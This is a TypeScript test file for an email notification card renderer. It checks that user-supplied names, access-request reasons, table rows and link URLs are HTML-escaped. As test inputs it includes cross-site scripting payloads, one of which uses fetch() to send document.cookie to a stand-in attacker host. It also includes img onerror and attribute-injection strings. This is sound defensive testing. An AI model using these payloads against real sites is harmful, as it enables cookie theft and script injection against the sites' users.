// The card interpolates two things a stranger controls: the name somebody typed
// into a sign-up form, and the free-text reason they gave for wanting access.
// Both land in an approver's inbox, so neither can reach the HTML unescaped.
//
//   node --test --experimental-strip-types packages/notify/test/card.test.ts

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { renderCard, escapeHtml } from '../src/card.ts';

test('escapes every character that could close out of context', () => {
  assert.equal(escapeHtml(`<>&"'`), '&lt;&gt;&amp;&quot;&#39;');
});

test('a script tag in a requested reason cannot reach the markup', () => {
  const html = renderCard({
    section: 'Access request',
    intro: 'Somebody asked for access.',
    body: '<script>fetch("https://evil.example?c="+document.cookie)</script>',
  });
  assert.ok(!html.includes('<script>'), 'raw script tag survived into the email');
  assert.ok(html.includes('&lt;script&gt;'), 'the reason should still be readable, escaped');
});

test('a name cannot break out of the greeting', () => {
  const html = renderCard({
    section: 'Access request',
    greetingName: '"><img src=x onerror=alert(1)>',
    intro: 'hello',
  });
  // Assert on the absence of a TAG, not on the absence of the string
  // "onerror=". The first version of this test looked for the latter and
  // failed against correct output: once escaped, the payload renders as the
  // literal characters `&lt;img src=x onerror=alert(1)&gt;`, which still
  // contains "onerror=" and is inert. A test that cannot tell inert text from
  // live markup fails on working code, which is worse than not having it.
  assert.ok(!html.includes('<img'), 'an image tag reached the markup');
  assert.ok(html.includes('&lt;img'), 'the payload should survive as readable, escaped text');
  // The quote is what would end the style attribute and start a new one.
  assert.ok(html.includes('&quot;'), 'the double quote was not escaped');
});

test('a meta label or value cannot inject either', () => {
  const html = renderCard({
    section: 'x',
    intro: 'x',
    meta: [['</td><td><script>bad()</script>', '<b>bold</b>']],
  });
  assert.ok(!html.includes('<script>bad()'), 'script injected through a meta label');
  assert.ok(!html.includes('<b>bold</b>'), 'markup injected through a meta value');
});

test('the call-to-action URL is escaped in the href', () => {
  const html = renderCard({
    section: 'x', intro: 'x',
    ctaLabel: 'Open', ctaUrl: 'https://digital.risansi.com/requests?a="onmouseover="bad()',
  });
  assert.ok(!html.includes('"onmouseover="bad()'), 'an attribute was injected through the URL');
});

test('drops meta rows with no value, so the box has no empty lines', () => {
  const html = renderCard({
    section: 'x', intro: 'x',
    meta: [['Your role', ''], ['Approved by', '   '], ['Application', 'Sales Portal']],
  });
  assert.ok(html.includes('Application'), 'the row with a value should render');
  assert.ok(!html.includes('Your role'), 'an empty row should be dropped, not rendered blank');
  assert.ok(!html.includes('Approved by'), 'a whitespace-only row should be dropped too');
});

test('omits the box entirely when there is nothing to put in it', () => {
  const html = renderCard({ section: 'x', intro: 'just a sentence' });
  assert.ok(!html.includes('border-left:3px solid'), 'an empty accented box was rendered');
});

test('omits the button when there is no destination', () => {
  const html = renderCard({ section: 'x', intro: 'x', ctaLabel: 'Open' });
  assert.ok(!html.includes('<a href'), 'a button with no URL was rendered');
});

test('falls back to a greeting and a footer rather than leaving holes', () => {
  const html = renderCard({ section: 'Access request', intro: 'x' });
  assert.ok(html.includes('Hi there,'));
  assert.ok(html.includes('Risansi Digital'));
});
